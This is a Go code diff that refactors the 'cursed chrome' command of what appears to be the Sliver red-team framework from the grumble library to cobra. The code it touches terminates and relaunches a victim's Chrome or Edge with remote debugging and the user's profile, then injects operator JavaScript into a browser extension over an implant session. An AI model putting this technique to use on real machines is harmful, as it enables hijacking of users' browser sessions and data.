@@ -29,6 +29,8 @@ import (
 	"time"
 
 	"github.com/AlecAivazis/survey/v2"
+	"github.com/spf13/cobra"
+
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/client/core"
 	"github.com/bishopfox/sliver/client/overlord"
@@ -36,7 +38,6 @@ import (
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/desertbit/grumble"
 )
 
 var (
@@ -51,13 +52,13 @@ var (
 )
 
 // CursedChromeCmd - Execute a .NET assembly in-memory
-func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
+func CursedChromeCmd(cmd *cobra.Command, con *console.SliverConsoleClient, args []string) {
 	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
 		return
 	}
 
-	payloadPath := ctx.Flags.String("payload")
+	payloadPath, _ := cmd.Flags().GetString("payload")
 	var payload []byte
 	var err error
 	if payloadPath != "" {
@@ -68,7 +69,7 @@ func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		}
 	}
 
-	curse := avadaKedavraChrome(session, ctx, con)
+	curse := avadaKedavraChrome(session, cmd, con, args)
 	if curse == nil {
 		return
 	}
@@ -96,10 +97,10 @@ func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		con.Printf("success!\n")
 		con.PrintInfof("Found viable Chrome extension %s%s%s (%s)\n", console.Bold, chromeExt.Title, console.Normal, chromeExt.ID)
 		con.PrintInfof("Injecting payload ... ")
-		ctx, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
-		// extCtxTimeout, cancel := context.WithTimeout(ctx, 10*time.Second)
+		cmd, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
+		// extCtxTimeout, cancel := context.WithTimeout(cmd, 10*time.Second)
 		// defer cancel()
-		_, err = overlord.ExecuteJS(ctx, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
+		_, err = overlord.ExecuteJS(cmd, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
 		if err != nil {
 			con.PrintErrorf("%s\n", err)
 			return
@@ -111,8 +112,8 @@ func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	}
 }
 
-func avadaKedavraChrome(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) *core.CursedProcess {
-	chromeProcess, err := getChromeProcess(session, ctx, con)
+func avadaKedavraChrome(session *clientpb.Session, cmd *cobra.Command, con *console.SliverConsoleClient, cargs []string) *core.CursedProcess {
+	chromeProcess, err := getChromeProcess(session, cmd, con)
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return nil
@@ -133,7 +134,7 @@ func avadaKedavraChrome(session *clientpb.Session, ctx *grumble.Context, con *co
 			return nil
 		}
 		terminateResp, err := con.Rpc.Terminate(context.Background(), &sliverpb.TerminateReq{
-			Request: con.ActiveTarget.Request(ctx),
+			Request: con.ActiveTarget.Request(cmd),
 			Pid:     chromeProcess.GetPid(),
 		})
 		if err != nil {
@@ -145,7 +146,7 @@ func avadaKedavraChrome(session *clientpb.Session, ctx *grumble.Context, con *co
 			return nil
 		}
 	}
-	curse, err := startCursedChromeProcess(false, session, ctx, con)
+	curse, err := startCursedChromeProcess(false, session, cmd, con, cargs)
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return nil
@@ -153,21 +154,21 @@ func avadaKedavraChrome(session *clientpb.Session, ctx *grumble.Context, con *co
 	return curse
 }
 
-func startCursedChromeProcess(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*core.CursedProcess, error) {
+func startCursedChromeProcess(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.SliverConsoleClient, cargs []string) (*core.CursedProcess, error) {
 	name := "Chrome"
 	if isEdge {
 		name = "Edge"
 	}
 
 	con.PrintInfof("Finding %s executable path ... ", name)
-	chromeExePath, err := findChromeExecutablePath(isEdge, session, ctx, con)
+	chromeExePath, err := findChromeExecutablePath(isEdge, session, cmd, con)
 	if err != nil {
 		con.Printf("failure!\n")
 		return nil, err
 	}
 	con.Printf("success!\n")
 	con.PrintInfof("Finding %s user data directory ... ", name)
-	chromeUserDataDir, err := findChromeUserDataDir(isEdge, session, ctx, con)
+	chromeUserDataDir, err := findChromeUserDataDir(isEdge, session, cmd, con)
 	if err != nil {
 		con.Printf("failure!\n")
 		return nil, err
@@ -175,31 +176,31 @@ func startCursedChromeProcess(isEdge bool, session *clientpb.Session, ctx *grumb
 	con.Printf("success!\n")
 
 	con.PrintInfof("Starting %s process ... ", name)
-	debugPort := getRemoteDebuggerPort(ctx)
+	debugPort := getRemoteDebuggerPort(cmd)
 	args := []string{
 		fmt.Sprintf("--remote-debugging-port=%d", debugPort),
 	}
 	if chromeUserDataDir != "" {
 		args = append(args, fmt.Sprintf("--user-data-dir=%s", chromeUserDataDir))
 	}
-	if ctx.Flags.Bool("restore") {
+	if restore, _ := cmd.Flags().GetBool("restore"); restore {
 		args = append(args, "--restore-last-session")
 	}
-	if ctx.Flags.Bool("keep-alive") {
+	if keepalive, _ := cmd.Flags().GetBool("keep-alive"); keepalive {
 		args = append(args, "--keep-alive-for-test")
 	}
-	if ctx.Flags.Bool("headless") {
+	if headless, _ := cmd.Flags().GetBool("headless"); headless {
 		args = append(args, "--headless")
 	}
-	additionalArgs := ctx.Args.StringList("args")
-	if len(additionalArgs) > 0 {
-		args = append(args, additionalArgs...)
+
+	if len(cargs) > 0 {
+		args = append(args, cargs...)
 	}
 
 	// Execute the Chrome process with the extra flags
 	// TODO: PPID spoofing, etc.
 	chromeExec, err := con.Rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
-		Request: con.ActiveTarget.Request(ctx),
+		Request: con.ActiveTarget.Request(cmd),
 		Path:    chromeExePath,
 		Args:    args,
 		Output:  false,
@@ -253,8 +254,8 @@ func startCursedChromeProcess(isEdge bool, session *clientpb.Session, ctx *grumb
 	return curse, nil
 }
 
-func findChromeUserDataDir(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
-	userDataFlag := ctx.Flags.String("user-data")
+func findChromeUserDataDir(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.SliverConsoleClient) (string, error) {
+	userDataFlag, _ := cmd.Flags().GetString("user-data")
 	if userDataFlag != "" {
 		return userDataFlag, nil
 	}
@@ -272,7 +273,7 @@ func findChromeUserDataDir(isEdge bool, session *clientpb.Session, ctx *grumble.
 				userDataDir = fmt.Sprintf("%s:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data", driveLetter, username)
 			}
 			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-				Request: con.ActiveTarget.Request(ctx),
+				Request: con.ActiveTarget.Request(cmd),
 				Path:    userDataDir,
 			})
 			if err != nil {
@@ -290,7 +291,7 @@ func findChromeUserDataDir(isEdge bool, session *clientpb.Session, ctx *grumble.
 			userDataDir = fmt.Sprintf("/Users/%s/Library/Application Support/Microsoft Edge", session.Username)
 		}
 		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-			Request: con.ActiveTarget.Request(ctx),
+			Request: con.ActiveTarget.Request(cmd),
 			Path:    userDataDir,
 		})
 		if err != nil {
@@ -306,8 +307,8 @@ func findChromeUserDataDir(isEdge bool, session *clientpb.Session, ctx *grumble.
 	}
 }
 
-func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
-	exeFlag := ctx.Flags.String("exe")
+func findChromeExecutablePath(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.SliverConsoleClient) (string, error) {
+	exeFlag, _ := cmd.Flags().GetString("exe")
 	if exeFlag != "" {
 		return exeFlag, nil
 	}
@@ -337,7 +338,7 @@ func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumb
 				chromeExecutablePath := strings.ReplaceAll(chromePath, "[DRIVE]", driveLetter)
 				chromeExecutablePath = strings.ReplaceAll(chromeExecutablePath, "[USERNAME]", username)
 				ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-					Request: con.ActiveTarget.Request(ctx),
+					Request: con.ActiveTarget.Request(cmd),
 					Path:    chromeExecutablePath,
 				})
 				if err != nil {
@@ -357,7 +358,7 @@ func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumb
 			defaultChromePath = "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"
 		}
 		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-			Request: con.ActiveTarget.Request(ctx),
+			Request: con.ActiveTarget.Request(cmd),
 			Path:    defaultChromePath,
 		})
 		if err != nil {
@@ -383,7 +384,7 @@ func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumb
 		}
 		for _, chromePath := range chromeLinuxPaths {
 			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
-				Request: con.ActiveTarget.Request(ctx),
+				Request: con.ActiveTarget.Request(cmd),
 				Path:    chromePath,
 			})
 			if err != nil {
@@ -401,7 +402,7 @@ func findChromeExecutablePath(isEdge bool, session *clientpb.Session, ctx *grumb
 }
 
 func isChromeProcess(executable string) bool {
-	var chromeProcessNames = []string{
+	chromeProcessNames := []string{
 		"chrome",           // Linux
 		"google-chrome",    // Linux
 		"chromium-browser", // Linux
@@ -416,9 +417,9 @@ func isChromeProcess(executable string) bool {
 	return false
 }
 
-func getChromeProcess(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*commonpb.Process, error) {
+func getChromeProcess(session *clientpb.Session, cmd *cobra.Command, con *console.SliverConsoleClient) (*commonpb.Process, error) {
 	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
-		Request: con.ActiveTarget.Request(ctx),
+		Request: con.ActiveTarget.Request(cmd),
 	})
 	if err != nil {
 		return nil, err
